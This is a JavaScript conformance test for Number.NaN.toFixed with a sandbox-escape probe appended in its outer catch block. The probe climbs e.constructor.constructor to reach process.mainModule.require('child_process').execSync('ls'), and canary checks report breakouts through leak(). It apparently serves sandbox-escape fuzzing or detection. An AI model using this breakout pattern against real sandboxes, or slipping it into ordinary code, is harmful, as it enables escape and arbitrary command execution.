try {
    if (Number.NaN.toFixed() !== 'NaN') {
        $ERROR('#1: Number.NaN.prototype.toFixed() === "NaN"');
    }
    if (Number.NaN.toFixed(0) !== 'NaN') {
        $ERROR('#2: Number.NaN.prototype.toFixed(0) === "NaN"');
    }
    if (Number.NaN.toFixed(1) !== 'NaN') {
        $ERROR('#3: Number.NaN.prototype.toFixed(1) === "NaN"');
    }
    if (Number.NaN.toFixed(1.1) !== 'NaN') {
        $ERROR('#4: Number.NaN.toFixed(1.1) === "NaN"');
    }
    if (Number.NaN.toFixed(0.9) !== 'NaN') {
        $ERROR('#5: Number.NaN.toFixed(0.9) === "NaN"');
    }
    if (Number.NaN.toFixed('1') !== 'NaN') {
        $ERROR('#6: Number.NaN.toFixed("1") === "NaN"');
    }
    if (Number.NaN.toFixed('1.1') !== 'NaN') {
        $ERROR('#7: Number.NaN.toFixed("1.1") === "NaN"');
    }
    if (Number.NaN.toFixed('0.9') !== 'NaN') {
        $ERROR('#8: Number.NaN.toFixed("0.9") === "NaN"');
    }
    if (Number.NaN.toFixed(Number.NaN) !== 'NaN') {
        $ERROR('#9: Number.NaN.toFixed(Number.NaN) === "NaN"');
    }
    if (Number.NaN.toFixed('some string') !== 'NaN') {
        $ERROR('#9: Number.NaN.toFixed("some string") === "NaN"');
    }
    try {
        s = Number.NaN.toFixed(Number.POSITIVE_INFINITY);
        $ERROR('#10: Number.NaN.toFixed(Number.POSITIVE_INFINITY) should throw RangeError, not return NaN');
    } catch (e) {
        if (!(e instanceof RangeError)) {
            $ERROR('#10: Number.NaN.toFixed(Number.POSITIVE_INFINITY) should throw RangeError, not ' + e);
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}